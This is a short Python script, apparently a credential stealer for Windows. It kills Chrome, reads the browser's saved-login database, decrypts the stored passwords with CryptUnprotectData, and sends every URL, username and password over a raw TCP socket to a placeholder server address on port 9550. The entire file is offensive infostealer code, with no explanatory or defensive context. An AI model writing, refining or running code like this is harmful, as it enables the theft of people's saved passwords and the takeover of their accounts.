import socket
import os 
import psutil
import sqlite3
import win32crypt

def Pkill():
    procname = 'chrome.exe'
    for proc in psutil.process_iter():
        try:
            if proc.name() == procname:
                proc.kill()
        except psutil.AccessDenied:
            pass

def connection():
    Pkill()
    conn = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
    c = conn.cursor()
    c.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = []
    for row in c.fetchall():
        passwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
        if passwd:
            passwords.append(row[0] + ' --- ' + row[1] + ' --- ' + passwd)
    return passwords


credentials = []
credentials = connection()
info = ''
for element in credentials:
    info +=element + '\n'

host = '<server_ip_address>'
portno = 9550

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, portno))

sock.send(info)

while True:
    pass
